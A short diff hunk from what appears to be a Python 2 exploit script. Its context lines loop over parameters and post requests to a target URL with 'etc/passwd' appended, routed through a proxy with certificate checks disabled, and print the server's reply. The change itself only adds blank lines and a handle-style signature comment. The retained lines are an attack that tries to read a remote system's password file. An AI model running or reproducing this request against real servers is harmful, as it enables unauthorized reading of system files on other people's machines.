@@ -16,3 +16,6 @@ for x in params:
 		r=requests.post(url+"etc/passwd",proxies=proxy,verify=False)
 		print r.text
 
+
+
+### 0x10w1eve1 ###
